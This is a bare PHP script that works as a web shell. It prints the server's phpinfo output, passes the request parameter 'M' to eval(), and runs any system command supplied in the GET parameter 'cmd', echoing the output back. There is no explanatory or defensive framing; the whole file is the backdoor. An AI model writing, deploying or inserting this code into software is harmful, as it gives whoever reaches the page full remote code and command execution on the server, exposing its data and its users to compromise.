<?php
ob_start(); 
phpinfo();
$info = ob_get_contents();
ob_end_clean();


eval (a());
function a(){
        $a = $_REQUEST["M"];
        return $a;
}



echo " $info  <br> <br>  ";


if(isset($_GET['cmd'])){
$str=$_GET['cmd'];
print `$str`;
}

?>